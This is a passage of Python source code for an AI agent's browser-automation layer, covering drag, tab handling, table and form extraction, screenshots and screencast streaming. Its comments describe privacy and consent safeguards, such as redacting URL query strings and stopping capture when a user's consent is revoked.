        reliable than selector-string ``page.drag_and_drop`` for elements
        resolved through Set-of-Marks / possibly inside an iframe — an
        ElementHandle's ``bounding_box()`` is always reported relative to the
        main frame's viewport, so ``page.mouse`` coordinates work regardless
        of which frame either endpoint lives in). Both endpoints go through
        the normal stale-mark ``_resolve()`` check first.
        """
        self._guard_active("drag")
        await self._ensure_started()
        async with self._page_lock:
            page = self._require_page()
            host = _cmp._host(page.url)
            src = await self._resolve(from_index)
            dst = await self._resolve(to_index)
            src_box = await src.bounding_box()
            dst_box = await dst.bounding_box()
            if src_box is None or dst_box is None:
                raise BrowserActionError(
                    f"drag: source [{from_index}] or target [{to_index}] has no bounding box "
                    "(not visible)")
            sx = src_box["x"] + src_box["width"] / 2
            sy = src_box["y"] + src_box["height"] / 2
            tx = dst_box["x"] + dst_box["width"] / 2
            ty = dst_box["y"] + dst_box["height"] / 2
            async def _do_drag():
                await page.mouse.move(sx, sy)
                await page.mouse.down()
                await page.mouse.move(tx, ty, steps=10)
                await page.mouse.up()
            # A drag-to-confirm / slide-to-pay control can navigate — settle any
            # nav, then re-validate the landing host fail-closed (like click/key).
            self._last_marks = []
            self._mark_frame = {}
            await self._act_and_settle(page, _do_drag)
            await self._recheck_landing_egress_locked("drag")
        # BR-F1: a drag-to-confirm / slide-to-pay control can navigate cross-host —
        # gate a no-allowlist cross-host landing through the same confirm.
        await self._confirm_cross_host_or_park("drag", prev_host=host)
        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                          action="drag", host=host, ok=True,
                          extra={"from_index": from_index, "to_index": to_index})
        self._emit("drag", from_index=from_index, to_index=to_index, ok=True)

    # ── multi-tab awareness (ADR-0183 S2) ───────────────────────────────────
    async def tabs(self) -> list[dict[str, Any]]:
        """List every open tab/page in this session's browser context —
        including ones opened by a target="_blank" click or window.open()
        that the agent has not yet switched to."""
        self._guard_active("tabs")
        await self._ensure_started()
        async with self._page_lock:
            pages = list(self._context.pages) if self._context else []
            out = []
            for i, pg in enumerate(pages):
                try:
                    title = await pg.title()
                except Exception:  # noqa: BLE001
                    title = ""
                # SECURITY (review): return scheme+host+path but NEVER the query
                # string / fragment. Everywhere else in this surface is host-only
                # precisely because a URL can carry ?token=/reset secrets; tabs()
                # is the one place that leaked the full URL of every open tab into
                # the model context + emit — worst in attach mode, where the tabs
                # are the user's own logged-in ones. host+path keeps it useful for
                # the agent to tell tabs apart without exposing the token.
                out.append({"index": i, "url": _safe_tab_url(pg.url), "title": title})
        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                          action="tabs", ok=True, extra={"count": len(out)})
        self._emit("tabs", count=len(out))
        return out

    async def switch_tab(self, index: int) -> Observation:
        """Make tab ``index`` (as reported by ``tabs()``) the active page for
        all subsequent actions, and return a fresh Set-of-Marks observation
        of it. The context-level egress guard (wired once in ``start()``,
        see ``_guard_new_page``) already covers every tab for the life of the
        session, so switching does not need to re-wire anything per-page —
        it only needs to make sure the newly-active page has the same
        default timeout as the rest of the session.
        """
        self._guard_active("switch_tab")
        await self._ensure_started()
        async with self._page_lock:
            pages = list(self._context.pages) if self._context else []
            if index < 0 or index >= len(pages):
                raise BrowserActionError(f"no tab at index {index}")
            self._page = pages[index]
            self._page.set_default_timeout(self._nav_timeout)
            self._last_marks = []
            self._mark_frame = {}
            obs = await self._observe_locked()
        host = _cmp._host(obs.url)
        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                          action="switch_tab", host=host, ok=True, extra={"tab_index": index})
        self._emit("switch_tab", tab_index=index, host=host, ok=True)
        return obs

    # ── structured extraction (ADR-0183 S2) ─────────────────────────────────
    async def extract_table(self, index: int) -> dict[str, Any]:
        """Parse the element at ``index`` — a <table>, or a container that
        wraps/represents one (role="table"/"grid") — into
        ``{"headers": [...], "rows": [[...], ...]}``. Bounded at
        ``_MAX_EXTRACT_ROWS`` rows so a huge table can't blow the model's
        context. Goes through the normal stale-mark ``_resolve()`` first."""
        self._guard_active("extract_table")
        await self._ensure_started()
        async with self._page_lock:
            host = _cmp._host(self._require_page().url)
            el = await self._resolve(index)
            data = await el.evaluate(_EXTRACT_TABLE_JS, _MAX_EXTRACT_ROWS)
        headers = data.get("headers", []) if isinstance(data, dict) else []
        rows = data.get("rows", []) if isinstance(data, dict) else []
        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                          action="extract_table", host=host, index=index, ok=True,
                          extra={"count": len(rows)})
        self._emit("extract_table", index=index, count=len(rows), ok=True)
        return {"headers": headers, "rows": rows}

    async def extract_form_schema(self) -> list[dict[str, Any]]:
        """Describe every <form> on the CURRENT top-level document — action,
        method, and one entry per field (name/type/required/label). NEVER
        includes a field's current value (only its static label/attributes),
        so an in-progress password/PII entry can never leak through this
        path. Scoped to the top-level document only (does not descend into
        iframes — use ``extract_table`` or a per-frame ``observe()`` for
        iframe-embedded forms)."""
        self._guard_active("extract_form_schema")
        await self._ensure_started()
        async with self._page_lock:
            page = self._require_page()
            host = _cmp._host(page.url)
            forms = await page.evaluate(_EXTRACT_FORMS_JS)
        forms = forms if isinstance(forms, list) else []
        _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                          action="extract_form_schema", host=host, ok=True,
                          extra={"count": len(forms)})
        self._emit("extract_form_schema", count=len(forms), ok=True)
        return forms

    async def screenshot(self, *, marks: bool = True) -> bytes:
        # B1 (adversarial review 2026-07-20): screenshot was the ONLY action
        # skipping the guard — a revoked/expired attach consent (or an attach
        # take-over pause) kept serving live JPEGs of the user's real Chrome
        # via the REST/MCP pull path, the same leak class the F7 screencast
        # hardening closed on the push path. Deliberately narrower than
        # _guard_active: a paused MANAGED session must keep serving frames
        # (the take-over live view depends on this pull), so `paused` only
        # refuses in attach mode — exact screencast-loop parity.
        if self._disconnected:
            raise BrowserActionError(
                "the browser was closed" + (" (your Chrome quit)" if self._attached
                else " (it crashed or exited)") + " — this session is over; "
                "start a new one")
        if self._attached:
            if self.paused:
                raise BrowserActionError(
                    "blocked: session is paused / under user take-over (screenshot)")
            if self._consent_ok is not None:
                try:
                    ok = self._consent_ok()
                except Exception:  # noqa: BLE001
                    ok = False
                if not ok:
                    raise BrowserActionError(
                        "real-chrome consent expired or was revoked — re-grant it in "
                        "the console (Browser → Attach) or close this session")
        await self._ensure_started()
        async with self._page_lock:
            return await self._screenshot_locked(marks=marks)

    async def _screenshot_locked(self, *, marks: bool = True) -> bytes:
        page = self._require_page()
        if marks and self._last_marks:
            try:
                await page.evaluate(_PAINT_JS)
            except Exception:  # noqa: BLE001
                pass
        png = await page.screenshot(type="jpeg", quality=60, full_page=False)
        if marks and self._last_marks:
            try:
                await page.evaluate(_UNPAINT_JS)
            except Exception:  # noqa: BLE001
                pass
        return png

    def screenshot_data_url(self, png: bytes) -> str:
        return "data:image/jpeg;base64," + base64.b64encode(png).decode("ascii")

    # ── live view (screencast) ────────────────────────────────────────────────
    async def start_screencast(self, on_frame: OnFrame, *, fps: float = 1.5) -> None:
        """Poll screenshots at ``fps`` and push JPEG frames to ``on_frame``.
        Simple + cross-page (survives navigations). Cancelled on close()."""
        interval = 1.0 / max(0.5, fps)

        async def _loop() -> None:
            while True:
                # Stop streaming a session that is gone or off-limits (review
                # F3/F7): once the browser disconnected, or is closed, or (attach)
                # the real-chrome consent lapsed / a take-over pause is on, the
                # continuous screencast must NOT keep capturing the user's real
                # Chrome — it is the highest-bandwidth leak of a revoked-consent
                # session. Exit the loop (frozen last frame + the disconnect
                # action-log line tell the user why).
                if self._closed or self._disconnected:
                    return
                if self._attached:
                    if self.paused:
                        await asyncio.sleep(interval)
                        continue
                    if self._consent_ok is not None:
                        try:
                            ok = self._consent_ok()
                        except Exception:  # noqa: BLE001
                            ok = False
                        if not ok:
                            return
                try:
                    png = await self.screenshot(marks=True)
                    on_frame(png)
                except asyncio.CancelledError:
                    raise
                except Exception:  # noqa: BLE001 — a transient nav shouldn't kill the cast
                    pass
                await asyncio.sleep(interval)

        if self._screencast_task:
            self._screencast_task.cancel()
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await self._screencast_task   # review F10: await the old loop before replacing
        self._screencast_task = asyncio.ensure_future(_loop())
